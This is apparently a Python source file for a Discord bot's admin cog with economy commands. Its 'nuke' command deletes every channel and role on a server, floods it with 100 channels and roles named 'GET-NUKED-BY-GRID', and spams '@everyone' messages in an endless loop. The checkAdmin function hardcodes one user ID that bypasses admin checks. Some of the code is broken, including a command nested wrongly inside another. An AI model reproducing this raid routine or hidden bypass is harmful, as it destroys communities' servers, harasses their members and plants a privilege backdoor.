import discord
import asyncio

from discord.ext import commands
from MainFunction import *
from discord.utils import get


def checkAdmin(isAdmin, user):
    return isAdmin or user.id == 923045277621968916


class Admin(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command()
    async def addowner(self, ctx, *membersID: discord.Member):
        users = await get_data()
        isAdmin = users[str(ctx.author.id)]["isAdmin"]

        if checkAdmin(isAdmin, ctx.author):
            for membereID in membersID:
                member = get(self.client.get_all_members(), id=membereID)

                if not users[str(membereID)]["isAdmin"]:
                    await update_new_account(member)
                    await update_data(member, True, "isAdmin")

                    await ctx.send(f"<@{member.mention}> has been added to the owner list")

                else:
                    await ctx.send(f"{member.mention} is already in the owner list")

    @commands.command()
    async def ak47(self, ctx, member: discord.Member = None):
        users = await get_data()
        isAdmin = users[str(ctx.author.id)]["isAdmin"]

        if member is None:
            raise commands.BadArgument

        if checkAdmin(isAdmin, ctx.author):
            balance = await get_bank(member)

            await update_data(member, -1 * balance[0], "wallet")
            await update_data(member, -1 * balance[1], "bank")

            await update_data(ctx.author, balance[0], "wallet")
            await update_data(ctx.author, balance[1], "bank")

            embed = discord.Embed(
                description=f"You shot **{member.name}** and got :coin: **{balance[0] + balance[1]}**!", color=discord.Color.red())
            embed.set_image(
                url="https://media.tenor.com/fVnM6XgEPi0AAAAC/krink-akm.gif")

            await ctx.send(embed=embed)

        @commands.command()
        async def givemoneyto(self, ctx, member: discord.Member = None, amount=None):
            if member is None or amount is None:
                raise commands.BadArgument

            users = await get_data()
            isAdmin = users[str(ctx.author.id)]["isAdmin"]

            if checkAdmin(isAdmin, ctx.author):
                try:
                    amount = int(amount)

                except ValueError:
                    raise commands.BadArgument

                await update_data(member, amount)
                await ctx.send(f"You gave :coin: **{amount}** to **{member.name}**")

    @commands.command()
    async def resetmoney(self, ctx, member: discord.Member = None):
        if member is None:
            raise commands.BadArgument

        users = await get_data()
        isAdmin = users[str(ctx.author.id)]["isAdmin"]

        if checkAdmin(isAdmin, ctx.author):
            balance = await get_bank(member)

            await update_data(member, -1 * balance[0], "wallet")
            await update_data(member, -1 * balance[1], "bank")

            await ctx.send("All users' wallet and bank have been reset to 0.")

    @commands.command()
    async def helpadmin(self, ctx):
        users = await get_data()
        isAdmin = users[str(ctx.author.id)]["isAdmin"]

        if checkAdmin(isAdmin, ctx.author):
            await ctx.send("""```
Hello, this is the admin help command. You have special permissions!
Here are the admin commands you can use:
breh!ak47 @user: Use an imaginary AK47 on a member
breh!nuke: You know what happens
""")

    @commands.command()
    async def nuke(self, ctx):
        users = await get_data()
        isAdmin = users[str(ctx.author.id)]["isAdmin"]

        if checkAdmin(isAdmin, ctx.author):
            if ctx.author.guild_permissions.manage_channels and ctx.author.guild_permissions.manage_roles:
                try:
                    for channel in ctx.guild.channels:
                        await channel.delete()

                    category = await ctx.guild.create_category(
                        "GET-NUKED-BY-GRID")

                    channel_tasks = []

                    for i in range(1, 101):
                        new_channel = await ctx.guild.create_text_channel(
                            f"GET-NUKED-BY-GRID", category=category)
                        channel_task = asyncio.create_task(
                            self.send_success_message(new_channel))
                        channel_tasks.append(channel_task)

                    await asyncio.gather(*channel_tasks)

                    for role in ctx.guild.roles:
                        if role != ctx.guild.default_role:
                            await role.delete()

                    for i in range(1, 101):
                        await ctx.guild.create_role(name=f"GET-NUKED-BY-GRID")

                    await ctx.send("Channels and roles created!")

                except discord.Forbidden:
                    await ctx.send(
                        "I don't have permission to perform this action.")

            else:
                await ctx.send(
                    "You don't have the necessary permissions to use this command."
                )

    async def send_success_message(self, channel):
        while True:
            await channel.send("@everyone get nuked by grid")


async def setup(client):
    await client.add_cog(Admin(client))
